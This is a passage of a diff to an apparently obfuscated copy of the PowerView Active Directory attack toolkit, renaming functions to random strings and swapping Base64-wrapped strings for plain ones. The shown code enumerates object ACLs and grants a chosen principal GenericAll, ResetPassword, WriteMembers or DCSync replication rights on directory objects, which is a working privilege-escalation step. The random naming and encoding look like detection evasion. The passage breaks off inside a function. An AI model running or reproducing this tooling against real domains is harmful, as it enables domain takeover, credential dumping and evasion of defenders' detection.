+                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                 }
             }
             if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
+                $Filter += "(|$IdentityFilter)"
             }
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RBY2xdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVy")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
+            if ($PSBoundParameters['LDAPFilter']) {
+                Write-Verbose "[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
 
             if ($Filter) {
-                $Searcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYkRmlsdGVyKQ==")))
+                $Searcher.filter = "(&$Filter)"
             }
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RBY2xdIEdldC1Eb21haW5PYmplY3RBY2wgZmlsdGVyIHN0cmluZzogezB9"))) -f $($Searcher.filter))
+            Write-Verbose ("[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: {0}" -f $($Searcher.filter))
 
             $Results = $Searcher.FindAll()
             $Results | Where-Object {$_} | ForEach-Object {
@@ -4855,32 +4859,32 @@ function icohnm {
                 }
 
                 try {
-                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRzZWN1cml0eWRlc2NyaXB0b3I=")))][0], 0 | ForEach-Object { if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2FjbA==")))]) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
-                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmlnaHRzRmlsdGVy")))]) {
+                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
+                        if ($PSBoundParameters['RightsFilter']) {
                             $GuidFilter = Switch ($RightsFilter) {
-                                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzZXRQYXNzd29yZA=="))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MDAyOTk1NzAtMjQ2ZC0xMWQwLWE3NjgtMDBhYTAwNmUwNTI5"))) }
-                                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVNZW1iZXJz"))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUy"))) }
-                                Default { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAw"))) }
+                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
+                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
+                                Default { '00000000-0000-0000-0000-000000000000' }
                             }
                             if ($_.ObjectType -eq $GuidFilter) {
-                                $_ | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $Object.distinguishedname[0]
-                                $_ | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))) $ObjectSid
+                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
+                                $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                                 $Continue = $True
                             }
                         }
                         else {
-                            $_ | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $Object.distinguishedname[0]
-                            $_ | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))) $ObjectSid
+                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
+                            $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                             $Continue = $True
                         }
 
                         if ($Continue) {
-                            $_ | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWN0aXZlRGlyZWN0b3J5UmlnaHRz"))) ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
+                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                             if ($GUIDs) {
                                 
                                 $AclProperties = @{}
                                 $_.psobject.properties | ForEach-Object {
-                                    if ($_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0VHlwZXxJbmhlcml0ZWRPYmplY3RUeXBlfE9iamVjdEFjZVR5cGV8SW5oZXJpdGVkT2JqZWN0QWNlVHlwZQ==")))) {
+                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                         try {
                                             $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                         }
@@ -4893,18 +4897,18 @@ function icohnm {
                                     }
                                 }
                                 $OutObject = New-Object -TypeName PSObject -Property $AclProperties
-                                $OutObject.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFDTA=="))))
+                                $OutObject.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                 $OutObject
                             }
                             else {
-                                $_.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFDTA=="))))
+                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                 $_
                             }
                         }
                     }
                 }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RBY2xdIEVycm9yOiB7MH0="))) -f $_)
+                    Write-Verbose ("[Get-DomainObjectAcl] Error: {0}" -f $_)
                 }
             }
         }
@@ -4912,7 +4916,7 @@ function icohnm {
 }
 
 
-function aethej {
+function rppzog {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -4952,7 +4956,7 @@ function aethej {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -4971,7 +4975,7 @@ function aethej {
 
         [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
         [String]
-        $Rights = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs"))),
+        $Rights = 'All',
 
         [Guid]
         $RightsGUID
@@ -4979,44 +4983,44 @@ function aethej {
 
     BEGIN {
         $TargetSearcherArguments = @{
-            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU=")))
+            'Properties' = 'distinguishedname'
             'Raw' = $True
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0RG9tYWlu")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $TargetDomain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0TERBUEZpbHRlcg==")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $TargetLDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0U2VhcmNoQmFzZQ==")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $TargetSearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
+        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
+        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
+        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }
 
         $PrincipalSearcherArguments = @{
-            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $PrincipalIdentity
-            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lk")))
+            'Identity' = $PrincipalIdentity
+            'Properties' = 'distinguishedname,objectsid'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpbmNpcGFsRG9tYWlu")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $PrincipalDomain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        $Principals = kzvwpf @PrincipalSearcherArguments
+        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
+        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
+        $Principals = guawbd @PrincipalSearcherArguments
         if (-not $Principals) {
-            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5hYmxlIHRvIHJlc29sdmUgcHJpbmNpcGFsOiAkUHJpbmNpcGFsSWRlbnRpdHk=")))
+            throw "Unable to resolve principal: $PrincipalIdentity"
         }
     }
 
     PROCESS {
-        $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $TargetIdentity
-        $Targets = kzvwpf @TargetSearcherArguments
+        $TargetSearcherArguments['Identity'] = $TargetIdentity
+        $Targets = guawbd @TargetSearcherArguments
 
         ForEach ($TargetObject in $Targets) {
 
-            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uZQ==")))
-            $ControlType = [System.Security.AccessControl.AccessControlType] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3c=")))
+            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
+            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
             $ACEs = @()
 
             if ($RightsGUID) {
@@ -5025,19 +5029,19 @@ function aethej {
             else {
                 $GUIDs = Switch ($Rights) {
                     
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzZXRQYXNzd29yZA=="))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MDAyOTk1NzAtMjQ2ZC0xMWQwLWE3NjgtMDBhYTAwNmUwNTI5"))) }
+                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                     
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVNZW1iZXJz"))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUy"))) }
-                    
-                    
+                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                     
                     
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RENTeW5j"))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MTEzMWY2YWEtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2Qy"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MTEzMWY2YWQtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2Qy"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ODllOTViNzYtNDQ0ZC00YzYyLTk5MWEtMGZhY2JlZGE2NDBj")))}
+                    
+                    
+                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                 }
             }
 
             ForEach ($PrincipalObject in $Principals) {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1Eb21haW5PYmplY3RBY2xdIEdyYW50aW5nIHByaW5jaXBhbCB7MH0gJyRSaWdodHMnIG9uIHsxfQ=="))) -f $($PrincipalObject.distinguishedname), $($TargetObject.Properties.distinguishedname))
+                Write-Verbose ("[Add-DomainObjectAcl] Granting principal {0} '$Rights' on {1}" -f $($PrincipalObject.distinguishedname), $($TargetObject.Properties.distinguishedname))
 
                 try {
                     $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)
@@ -5045,27 +5049,27 @@ function aethej {
                     if ($GUIDs) {
                         ForEach ($GUID in $GUIDs) {
                             $NewGUID = New-Object Guid $GUID
-                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXh0ZW5kZWRSaWdodA==")))
+                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                             $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                         }
                     }
                     else {
                         
-                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0FsbA==")))
+                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                         $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                     }
 
                     
                     ForEach ($ACE in $ACEs) {
-                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1Eb21haW5PYmplY3RBY2xdIEdyYW50aW5nIHByaW5jaXBhbCB7MH0gcmlnaHRzIEdVSUQgJ3sxfScgb24gezJ9"))) -f $($PrincipalObject.distinguishedname), $($ACE.ObjectType), $($TargetObject.Properties.distinguishedname))
+                        Write-Verbose ("[Add-DomainObjectAcl] Granting principal {0} rights GUID '{1}' on {2}" -f $($PrincipalObject.distinguishedname), $($ACE.ObjectType), $($TargetObject.Properties.distinguishedname))
                         $TargetEntry = $TargetObject.GetDirectoryEntry()
-                        $TargetEntry.PsBase.Options.SecurityMasks = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGFjbA==")))
+                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                         $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
                         $TargetEntry.PsBase.CommitChanges()
                     }
                 }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1Eb21haW5PYmplY3RBY2xdIEVycm9yIGdyYW50aW5nIHByaW5jaXBhbCB7MH0gJyRSaWdodHMnIG9uIHsxfSA6IHsyfQ=="))) -f $($PrincipalObject.distinguishedname), $($TargetObject.Properties.distinguishedname), $_)
+                    Write-Verbose ("[Add-DomainObjectAcl] Error granting principal {0} '$Rights' on {1} : {2}" -f $($PrincipalObject.distinguishedname), $($TargetObject.Properties.distinguishedname), $_)
                 }
             }
         }
@@ -5073,7 +5077,7 @@ function aethej {
 }
 
 
-function sixayy {
+function fiqehj {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -5113,7 +5117,7 @@ function sixayy {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -5132,7 +5136,7 @@ function sixayy {
 
         [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
         [String]
-        $Rights = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs"))),
+        $Rights = 'All',
 
         [Guid]
         $RightsGUID
@@ -5140,44 +5144,44 @@ function sixayy {
 
     BEGIN {
         $TargetSearcherArguments = @{
-            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU=")))
+            'Properties' = 'distinguishedname'
             'Raw' = $True
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0RG9tYWlu")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $TargetDomain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0TERBUEZpbHRlcg==")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $TargetLDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0U2VhcmNoQmFzZQ==")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $TargetSearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
+        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
+        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
+        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }
 
         $PrincipalSearcherArguments = @{
-            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $PrincipalIdentity
-            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lk")))
+            'Identity' = $PrincipalIdentity
+            'Properties' = 'distinguishedname,objectsid'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpbmNpcGFsRG9tYWlu")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $PrincipalDomain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        $Principals = kzvwpf @PrincipalSearcherArguments
+        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
+        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
+        $Principals = guawbd @PrincipalSearcherArguments
         if (-not $Principals) {
-            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5hYmxlIHRvIHJlc29sdmUgcHJpbmNpcGFsOiAkUHJpbmNpcGFsSWRlbnRpdHk=")))
+            throw "Unable to resolve principal: $PrincipalIdentity"
         }
     }
 
     PROCESS {
-        $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $TargetIdentity
-        $Targets = kzvwpf @TargetSearcherArguments
+        $TargetSearcherArguments['Identity'] = $TargetIdentity
+        $Targets = guawbd @TargetSearcherArguments
 
         ForEach ($TargetObject in $Targets) {
 
